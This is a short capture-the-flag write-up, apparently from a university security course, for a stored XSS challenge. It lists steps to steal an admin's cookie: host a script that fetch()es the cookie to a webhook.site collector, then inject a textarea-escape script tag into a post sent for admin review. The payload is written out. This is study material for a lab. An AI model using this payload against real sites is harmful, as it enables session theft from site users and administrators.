# Challenge `Read my lips No more scripts` writeup

- Vulnerability: Cross-Site Scripting Lab (XSS)

- Where: textarea 'content' (lure admin)

- Impact: attacker is able to inject malicious code in the webpage by exploting the html vulnerability with a script from a server

---

## Steps to reproduce

1. Use an online service to collect your http requests such as Webhook.
2. Connect to your bin with https://webhook.site/< random_identifier_you_were_given>.
3. SSH to sigma with sigma.ist.utl.pt -l 'username'.
4. Go to /web and create a file (e.g. nano) and create a script.js.
5. On the script fetch the url from webhook with the encoded cookie (same logic from previous challenges), like this:
- fetch(url) 
6. Create a post and on the content field, use the textarea exploit again to pass the js script on the sigma server:
- < /textarea>< script src="https://web.tecnico.ulisboa.pt/~ist1110976/script.js" >< /script>< textarea>
7. Update post & send to admin for review.


[(POC)](Read_my_lips_No_more_scripts.js)

